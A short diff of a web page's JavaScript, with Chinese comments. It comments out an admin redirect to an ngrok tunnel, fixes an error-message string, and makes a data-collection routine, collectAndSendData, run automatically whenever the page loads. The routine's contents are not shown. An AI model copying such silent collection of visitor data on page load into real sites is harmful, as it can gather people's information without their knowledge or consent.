@@ -427,7 +427,9 @@
         if (result.success) {
           showSuccessMessage('管理者登入成功！');
           adminModalOverlay.style.display = 'none';
-        window.location.href = 'https://3df0-125-227-108-79.ngrok-free.app/admin.php';
+
+          // 管理者登入成功後，視需求可跳轉後台
+          // window.location.href = 'https://3df0-125-227-108-79.ngrok-free.app/admin_dashboard.php';
         } else {
           showErrorMessage('管理者登入失敗：' + (result.error || '未知原因'));
         }
@@ -553,7 +555,7 @@
         if (result.success) {
           if (statusElem) statusElem.innerText = '資料已成功發送！';
         } else {
-          if (statusElem) statusElem.innerText = '資料發送失敗：${result.error}';
+          if (statusElem) statusElem.innerText = `資料發送失敗：${result.error}`;
         }
       } catch (error) {
         console.error('資料收集或傳送過程中發生錯誤:', error);
@@ -562,13 +564,14 @@
         }
       }
     }
+
     /************************************************
      * 8. 頁面載入後 (可視需求預先執行收集)
      ************************************************/
     document.addEventListener('DOMContentLoaded', () => {
-      // 如需一進頁面就收集, 可呼叫 collectAndSendData();
+      // 如需一進頁面就收集, 可呼叫 
       collectAndSendData();
     });
   </script>
 </body>
-</html> 
+</html>
